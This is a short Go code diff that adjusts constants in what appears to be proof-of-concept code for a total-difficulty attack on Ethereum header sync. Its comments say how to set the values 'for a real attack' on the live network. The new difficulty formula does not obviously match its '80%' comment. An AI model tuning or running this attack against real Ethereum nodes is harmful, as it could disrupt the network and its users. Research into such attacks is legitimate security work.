@@ -43,13 +43,14 @@ var (
 															// difficulty, which is the same as the minimum difficulty.
 															// However, to run this attack in the real Ethereum network,
 															// D0 should be set to the current difficulty (ca 14*10^15)
+	Tb = 2	// Average time to mine a new block
 	
 	HigherTd = new(big.Int).Mul(big.NewInt(1_000_000_000_000), big.NewInt(1_000_000_000_000)) // 10^24
-	headersDownloadTime = 5*60
-	DifficultySupplement = new(big.Int).Mul(D0, big.NewInt(int64(85*headersDownloadTime/1300)))
-																// This corresponds to the TD of 85% of the number of
+	headersDownloadTime = 8*60
+	DifficultySupplement = new(big.Int).Mul(D0, big.NewInt(int64(80*headersDownloadTime/Tb*100)))
+																// This corresponds to the TD of 80% of the number of
 																// new blocks mined during the headers download.
-																// For a real attack, this would be ca. 470 (2hrs).
+																// For a real attack, this would be ca. 440*D0 (2hrs).
 
 	RangeOne, _ = new(big.Int).SetString("0x1000000000000000000000000000000000000000", 0)
 )
